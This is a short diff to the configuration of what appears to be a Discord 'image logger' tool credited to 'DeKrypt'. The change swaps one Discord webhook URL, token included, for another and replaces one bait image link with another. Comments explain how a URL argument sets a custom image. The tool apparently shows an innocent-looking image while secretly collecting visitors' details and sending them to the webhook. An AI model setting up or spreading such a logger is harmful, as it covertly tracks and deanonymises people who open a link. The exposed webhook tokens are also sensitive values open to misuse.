@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1351294511422115961/82hgW6p2IbNQiX9bOBGLtyvNPAKfncTUkObQNIMcc1kq0fTGbtpSxmGrVe-JsZywxntk",
-    "image": "https://i.postimg.cc/7P0P6wQW/raf-360x360-075-t-fafafa-ca443f4786-u1.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1351629998846509149/jiOEclb7_RJFIZzFd60FaedplGbFArkfLoNxE7zXuzbtECW0XOIwRdmXMHARKtMiMrFp",
+    "image": "https://assets.puzzlefactory.com/puzzle/500/623/original.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
     # CUSTOMIZATION #
